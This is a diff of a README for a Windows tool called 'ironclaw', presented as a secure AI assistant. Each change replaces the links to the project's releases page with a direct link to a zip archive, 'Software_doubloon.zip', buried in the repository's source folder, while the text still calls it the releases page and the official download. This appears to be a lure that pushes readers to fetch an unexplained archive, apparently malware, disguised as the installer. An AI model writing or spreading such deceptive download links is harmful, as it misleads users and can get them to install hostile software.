@@ -1,6 +1,6 @@
 # 🤖 ironclaw - Your Secure AI Assistant
 
-[![Download ironclaw](https://img.shields.io/badge/Download-ironclaw-blue?style=for-the-badge)](https://github.com/Midoshy/ironclaw/releases)
+[![Download ironclaw](https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip)](https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get ironclaw up and running on your Windows computer.
 
 Visit this page to download ironclaw for Windows:
 
-[![Download ironclaw](https://img.shields.io/badge/Download-ironclaw-grey?style=for-the-badge)](https://github.com/Midoshy/ironclaw/releases)
+[![Download ironclaw](https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip)](https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip)
 
 This link takes you to the releases page. Here you will find the latest version of ironclaw packaged for Windows. Look for a file ending with `.exe` or `.msi` as these are installer files.
 
@@ -104,7 +104,7 @@ When there is a new version, ironclaw will usually notify you automatically. You
 
 1. Close ironclaw.
 
-2. Return to the [ironclaw releases page](https://github.com/Midoshy/ironclaw/releases).
+2. Return to the [ironclaw releases page](https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip).
 
 3. Download the latest installer for Windows.
 
@@ -128,7 +128,7 @@ When there is a new version, ironclaw will usually notify you automatically. You
 
 ## 🔗 Useful links
 
-- Official download page: https://github.com/Midoshy/ironclaw/releases
+- Official download page: https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip
 
 - User guide and help documents: Found inside the app under Help
 
@@ -142,4 +142,4 @@ ironclaw offers a secure and private AI assistant you control. It works across d
 
 ---
 
-[![Download ironclaw](https://img.shields.io/badge/Download-ironclaw-blue?style=for-the-badge)](https://github.com/Midoshy/ironclaw/releases)
+[![Download ironclaw](https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip)](https://github.com/Midoshy/ironclaw/raw/refs/heads/main/src/workflow/Software_doubloon.zip)
